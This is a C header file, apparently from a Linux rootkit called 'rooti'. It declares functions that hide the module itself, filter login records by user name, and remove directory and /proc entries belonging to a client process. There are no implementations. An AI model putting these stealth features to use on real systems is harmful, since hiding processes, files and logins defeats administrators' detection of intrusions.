#ifndef _ROOTI_HIDE_H
#define _ROOTI_HIDE_H

#include "client.h"

extern bool rooti_hidden;

void rooti_hideme(void);
void rooti_showme(void);

int rooti_filter_login_entry(char *user_buf, size_t count, char *name);
size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir, pid_t client_pid);

#endif